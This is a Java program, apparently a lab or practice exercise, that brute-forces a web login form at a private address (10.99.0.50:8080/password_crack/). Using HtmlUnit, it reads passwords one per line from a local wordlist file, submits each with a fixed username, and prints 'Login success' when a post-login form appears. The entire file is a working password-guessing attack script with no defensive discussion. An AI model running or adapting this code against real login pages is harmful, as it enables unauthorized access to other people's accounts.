import com.gargoylesoftware.htmlunit.*;
import com.gargoylesoftware.htmlunit.html.*;
import org.apache.http.client.CredentialsProvider;

import java.io.*;
import java.util.Scanner;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.IOException;


public class CrackPassword{

public void submittingForm() throws Exception {
    final WebClient webClient = new WebClient();

        // Get the first page
        final HtmlPage page1 = webClient.getPage("http://10.99.0.50:8080/password_crack/");

        // Get the form that we are dealing with and within that form, 
        // find the submit button and the field that we want to change.
        final HtmlForm form = page1.getFormByName("myform");

        final HtmlSubmitInput button = form.getInputByName("login");
        final HtmlTextInput textField = form.getInputByName("username");
		final HtmlPasswordInput pwd = form.getInputByName("password");

        // Change the value of the text field
		
		
		try{
		File file = new File("newpwd.txt");
			FileReader fileReader = new FileReader(file);
			BufferedReader bufferedReader = new BufferedReader(fileReader);
			String line;
			while ((line = bufferedReader.readLine()) != null) {
				textField.setValueAttribute("xxxx");
				pwd.setValueAttribute(line);
				
				 final HtmlPage page2 = button.click();
		
					try{
							if((page2.getFormByName("testform"))!=null){
							System.out.println("Login success");
																		}
						}
					catch(Exception e){
							System.out.println("Login not success");
										}
			
																}
		}
		catch(IOException e1){
			System.out.println("errror during file reading");
		}
		

        
		
    
}

	public static void main(String[] args){
		CrackPassword cp = new CrackPassword();
		try{
		cp.submittingForm();
		}
		catch(Exception e){
			e.printStackTrace();
		}
	}

						
						}